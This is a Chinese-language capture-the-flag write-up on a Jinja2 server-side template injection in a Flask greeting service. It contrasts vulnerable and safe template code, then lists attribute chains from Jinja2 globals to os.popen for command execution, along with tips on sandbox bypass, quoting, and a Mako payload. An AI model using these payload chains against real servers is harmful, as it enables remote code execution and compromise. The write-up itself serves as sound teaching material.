## 题目背景

Note

Greeting Service (Python + Flask + Jinja2)：

- 表单 `name` 字段 -> `GET /greet?name=X` -> 服务端渲染 `"Hello, X!"` 页面
- 首页提示: `"Flag 位于 /flag"`
- 入口明显: 用户输入被拼接进模板后再 `render_template_string`

核心约束: 题目是文件系统而非环境变量藏 `flag` (`/flag`)，任何能 RCE 的 Jinja2 payload 都可以 `cat /flag`。

## 漏洞本质

Server-Side Template Injection (SSTI) 是 CWE-1336 / OWASP Top 10 2021 `A03: Injection` 里的模板引擎子类。本题代码骨架（推断自响应行为）：

[代码块边界]python
from flask import render_template_string, request

@app.route('/greet')
def greet():
    name = request.args.get('name', '')
    # ⚠️ 漏洞：把用户输入拼接进模板源码
    tpl = f"<h2>Hello, {name}!</h2><p>Welcome to Greeting Service.</p>"
    return render_template_string(tpl)
[代码块边界]

\

**等价错误写法（都是 SSTI）：**

[代码块边界]python
# ❌ 错误 1: f-string 拼接
return render_template_string(f"Hello, {name}!")

# ❌ 错误 2: % 格式化
return render_template_string("Hello, %s!" % name)

# ❌ 错误 3: .format()
return render_template_string("Hello, {}!".format(name))

# ❌ 错误 4: 直接传字符串当模板
return render_template_string(user_supplied_template)

# ✅ 正确：变量参数化
return render_template_string("Hello, {{ name }}!", name=name)
[代码块边界]

\

**SSTI vs XSS 的本质区别：**

- XSS: 用户输入在浏览器中被执行为 JS -> 影响其他用户浏览器
- SSTI: 用户输入在服务端中被执行为模板代码 -> 直接 RCE 服务器
- SSTI 是比 XSS 危险 100 倍的漏洞，直接 = 服务器 shell

\

| `{{7*'7'}}` | 7777777 | 7777777 | ERROR | ERROR | ERROR |

## 关键前置知识

### Jinja2 SSTI 的核心攻击面：Python 对象反射

Jinja2 表达式里能做以下事情：

1. 属性访问：`obj.attr` / `obj['attr']`
2. 方法调用：`obj.method(arg)`
3. Python 内置：`str` / `dict` / `type` / 运算符

用属性链一步步走到 **已经 import 过 os 的模块的全局命名空间**，就能执行命令。

\

### 3 类常用 globals（Jinja2 默认可用）：

| Global | 用途 | 到 os 的最短链 |
| --- | --- | --- |
| `cycler` | 循环辅助类 | `cycler.__init__.__globals__.os` |
| `joiner` | 字符串连接辅助 | `joiner.__init__.__globals__.os` |
| `namespace` | 命名空间工厂 | `namespace.__init__.__globals__.os` |
| `lipsum` | 生成假文本 | `lipsum.__globals__.os` |
| `range` | Python 内置 `range` | `range.__init__.__globals__.__builtins__.__import__('os')` |
| `config` | Flask config 对象 | `config.__class__.__init__.__globals__['os']` |
| `request` | Flask request | `request.application.__globals__['__builtins__']['__import__']('os')` |
| `self` | 当前模板上下文 | `self.__init__.__globals__.__builtins__.__import__('os')` |

## 常见坑

| 问题 | 根因 | 解决 |
| --- | --- | --- |
| `{{7+7}}` 通过 curl 发出变空 | zsh/bash 把 `{}` 当 brace expansion | 用 `--data-urlencode "name={{7+7}}"` |
| `cat /flag` 中 `/` 被 URL 某层编码丢 | POST body 和 QS 解析差异 | 用 `--data-urlencode` 让 curl 正确编码 |
| `{{ config.__class__.__... }}` 报 UndefinedError | 某些新版 Jinja2 `__class__` 过滤 | 改 `cycler.__init__.__globals__` 路径 |
| `{% ... %}` 不显示输出 | statement 不渲染返回值 | 用 `{{ ... }}` expression |
| 命令执行了但无回显 | popen 返回 pipe 没 read | 末尾加 `.read()` |
| `mro[1].__subclasses__()[N]` 的 N 随 Python 版本变 | Python 版本不同子类顺序不同 | 先 `{{ ''.__class__.__mro__[1].__subclasses__() }}` 看全列表 |
| `SandboxedEnvironment` 限制属性访问 | Jinja2 沙箱关了 `__class__` 等 | 用 `config.__init__` / `request.application` 等绕 |
| 响应被 autoescape | HTML 实体化 `< / >` 但内容还在 | 不影响字符串型 flag，影响观察执行结果时需 view-source |

## SSTI 进阶 10 谱

Important

1. Jinja2 本题路径（ `cycler.__init__.__globals__.os.popen` ）
2. Mako Python - `<%=request.args.x%>`、`${self.module.cache.util.os.popen(...)}`
